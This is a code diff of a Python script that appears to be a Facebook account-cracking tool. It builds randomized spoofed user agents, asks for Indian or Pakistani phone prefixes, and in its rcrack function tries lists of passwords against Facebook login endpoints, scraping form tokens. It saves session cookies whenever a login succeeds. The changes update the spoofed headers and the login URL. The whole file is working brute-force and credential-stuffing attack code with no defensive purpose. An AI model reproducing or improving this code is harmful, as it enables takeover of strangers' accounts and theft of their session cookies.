@@ -249,7 +249,7 @@ for xd in range(5000):
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
@@ -266,7 +266,7 @@ for xd in range(5000):
     d=random.choice(['X677','F98', 'NOTE 2', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 ', 'Hot 10', 'Hot 10 ', 'Note 4', 'Note 4 ', 'Hot 10s', 'Note 5', 'Note 10s ', 'Note 5', 'Note 6', 'Note 7 ', 'Note 7', 'Note 7 ', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 ', 'Hot 12 ', 'HOT','Note 12 '])
     e=random.randrange(1, 999)
     f=random.choice(['Pro 5G','Play NFC', 'Stylus', 'Play', 'NFC', 'Stylus', 'LTE', 'LITE', 'Lite', 'Zero', 'Pro', 'Play 5G', 'Pro NFC', 'i', 'VIP', '2020', '2022', 'Ultra', 'Ultra 5G', 'Smart 3G', 'Smart HD', 'Y88', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
@@ -282,13 +282,13 @@ for xd in range(5000):
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(44,160)
     l='Mobile Safari/537.36'
-    ag = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FB_IAB/FB4A;FBAV/378.0.0.18.112;]', '[FB_IAB/FB4A;FBAV/377.0.0.22.107;]', '[FB_IAB/FB4A;FBAV/401.0.0.24. 77;]', '[FB_IAB/FB4A;FBAV/381.0.0.29. 105;]', '[FBAN/EMA;FBLC/fr_FR;FBAV /333.0.0.12.108;]', '[FB_IAB/FB4A;FBAV/395.0.0.27. 214;]', '[FB_IAB/FB4A;FBAV/387.0.0.24. 102;]', '[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]', '[FB_IAB/FB4A;FBAV/377.0.0.22.107;]', '[FB_IAB/FB4A;FBAV/430.0.0.23.113;]', '[FB_IAB/FB4A;FBAV/425.0.0.22.49;]', '[FBAN/EMA;FBLC/en_US;FBAV/363.0.0.6.63;]']
+    ag = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FB_IAB/FB4A;FBAV/378.0.0.18.112;]', '[FB_IAB/FB4A;FBAV/377.0.0.22.107;]', '[FB_IAB/FB4A;FBAV/401.0.0.24. 77;]', '[FB_IAB/FB4A;FBAV/381.0.0.29. 105;]', '[FBAN/EMA;FBLC/fr_FR;FBAV /333.0.0.12.108;]', '[FB_IAB/FB4A;FBAV/395.0.0.27. 214;]', '[FB_IAB/FB4A;FBAV/387.0.0.24. 102;]', '[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]', '[FB_IAB/FB4A;FBAV/377.0.0.22.107;]', '[FB_IAB/FB4A;FBAV/430.0.0.23.113;]', '[FB_IAB/FB4A;FBAV/430.0.0.23.113;]', '[FB_IAB/Orca-Android;FBAV/326.9.0.13.112;]']
     m = random.choice(ag)
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l} {m}')
     ugen.append(uaku2)
@@ -326,18 +326,18 @@ for xd in range(5000):
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
 	
-    aa='Mozilla/5.0 (Linux; Android'
+    aa='Mozilla/5.0 (Windows NT 10.0;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
     c=random.choice(['Win64; x64'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
     h=random.randrange(80,103)
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
+    l='Chrome/85.0.4183.121 Safari/537.36'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
     
@@ -356,7 +356,7 @@ def i():
     print('\033[1;32m============================================')
     print('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
     print('\033[1;32m============================================')
-    print('\033[1;36m     \t     PAK CODES\n     \033[1;33m92302, \033[1;33m92345 ,\033[1;33m92306 ,\033[1;33m92303 ...\033[0;97m')
+    print('\033[1;36m     \t     Pak CODES\n     \033[1;33m92302, \033[1;33m92345 ,\033[1;33m92306 ,\033[1;33m92303 ...\033[0;97m')
     print('\033[1;32m============================================\n')
     code = input(' PUT CODE : ')
     print("")
@@ -400,7 +400,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://mobile.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -412,28 +412,31 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {
-     'authority': 'mobile.facebook.com',
-    'method': 'GET',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=vHcHZYJsFowJwq2_wLJ4sn1n; sb=vHcHZaSIfSeidnc4s4Zg2afq; m_pixel_ratio=1; wd=360x728; fr=08fxF6aICEai0NKvI..BlB3e8.ht.AAA.0.0.BlB3fN.AWXE1oqDyEo',
-    'dpr': '3',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"(Not(A:Brand";v="99"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0"',
+    'authority': 'x.facebook.com',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'datr=jRboZKkkWlD4hAfDY0fpErny; sb=jRboZDLFI-71m370snCg-JpV; locale=en_US; m_pixel_ratio=2.625; dpr=2.625; wd=412x724; fr=0iKjeQKOXB1qWFEmv.AWVUB1d5tlLXB6RSIggO53KMy1o.Bk6BdY.72.AAA.0.0.Bk6B41.AWVXunkP3x4',
+    'dpr': '2.625',
+    'origin': 'https://x.facebook.com',
+    'referer': 'https://x.facebook.com/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
+    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5836.202", "Google Chrome";v="114.0.5836.202"',
     'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '"TECNO CH7n"',
+    'sec-ch-ua-model': '"SM-G975U"',
     'sec-ch-ua-platform': '"macOS"',
     'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro}
-            
-            lo = session.post('https://mobile.facebook.com/login.php?next=https%3A%2F%2Ffree.facebook.com%2F&refsrc=deprecated&zero_e=3&zero_et=1694988280&_rdc=1&_rdr/',data=log_data,headers=header_freefb).text,
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': pro,
+    'viewport-width': '412',
+    'x-asbd-id': '129477',
+    'x-fb-lsd': 'AVrqBrF5Idc',
+    'x-requested-with': 'XMLHttpRequest',
+    'x-response-format': 'JSONStream',}  
+            lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text,
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -459,7 +462,6 @@ def rcrack(uid,pwx,tl):
         pass
  
 NASRAT()
-
 
 
 
